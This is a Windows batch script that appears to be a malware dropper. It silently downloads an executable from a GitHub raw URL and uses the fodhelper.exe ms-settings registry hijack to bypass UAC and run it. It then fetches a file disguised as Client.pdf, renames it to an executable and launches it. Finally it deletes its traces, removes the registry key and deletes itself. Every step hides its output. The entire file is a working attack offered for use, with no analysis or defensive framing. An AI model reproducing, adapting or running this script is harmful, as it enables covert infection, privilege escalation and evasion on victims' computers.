@echo off
setlocal

:: Set the download URL and the target path for 3.exe
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/pump.exe"
set "output1=C:\Users\%USERNAME%\AppData\\pu.exe" 

:: Download the 3.exe file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%'" >nul 2>&1

:: Check if the download was successful without echoing messages
if exist "%output1%" (
    rem Downloaded successfully, do nothing
) else (
    exit /b 1
)

:: Create the registry key for ms-settings silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1

:: Set the DelegateExecute property silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1

:: Wait for 5 seconds silently
timeout /t 5 /nobreak >nul 2>&1

:: Set the default value to run 3.exe silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%output1%" /f >nul 2>&1

:: Wait for another 10 seconds silently
timeout /t 10 /nobreak >nul 2>&1

:: Start fodhelper.exe silently
start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1

:: Wait for 10 seconds silently
timeout /t 10 /nobreak >nul 2>&1

:: Set the download URL and the target path for Client.pdf
set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
set "output2=C:\Users\%USERNAME%\AppData\Local\sam.pdf"

:: Download the Client.pdf file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%'" >nul 2>&1

:: Check if the download was successful without echoing messages
if exist "%output2%" (
    rem Downloaded successfully, do nothing
) else (
    exit /b 1
)

:: Wait for 3 seconds silently
timeout /t 3 /nobreak >nul 2>&1

:: Convert client.pdf to client.exe by renaming silently
ren "%output2%" "client.exe" >nul 2>&1

:: Start client.exe silently
start /min "" "%output2:pdf=exe%" >nul 2>&1

:: Wait for 3 seconds before deleting files
timeout /t 3 /nobreak >nul 2>&1

:: Delete 3.exe
del "%output1%" >nul 2>&1

:: Remove the ms-settings registry key immediately before self-deletion
powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1

:: Create a secondary batch script to delete this script
(
echo @echo off
echo :Repeat
echo del "%~f0" ^>nul 2^>^&1
echo if exist "%~f0" goto Repeat
) > "%TEMP%\delete_self.bat"

:: Run the secondary batch script to delete this script
start /min "" "%TEMP%\delete_self.bat"

endlocal

